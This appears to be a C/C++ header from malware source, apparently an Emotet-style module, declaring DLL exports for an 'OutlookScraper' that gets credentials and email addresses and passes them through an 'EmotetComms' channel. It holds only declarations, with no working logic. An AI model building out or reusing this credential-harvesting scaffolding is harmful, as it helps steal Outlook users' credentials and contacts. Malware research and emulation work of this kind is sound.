#pragma once
#include "pch.h"
#include "stdio.h"
#include "comms.h"

#define BUFSIZE (2 << 14)

typedef BOOL(__cdecl* getCredentialsPtr)(char* str, int length, bool stop, bool restart);
typedef BOOL(__cdecl* getEmailAddressesPtr)(char* str, int length, bool stop, bool restart);

#ifdef LOADOUTLOOKSCRAPER
#define LOADOUTLOOKSCRAPER __declspec(dllexport) 
#else 
#define LOADOUTLOOKSCRAPER __declspec(dllimport) 
#endif

LOADOUTLOOKSCRAPER bool loadOutlookScraper(EmotetComms *, string);
LOADOUTLOOKSCRAPER bool getCredentialsOutlookScraper(EmotetComms*, bool, bool);
LOADOUTLOOKSCRAPER bool getEmailAddressesOutlookScraper(EmotetComms*, bool, bool);
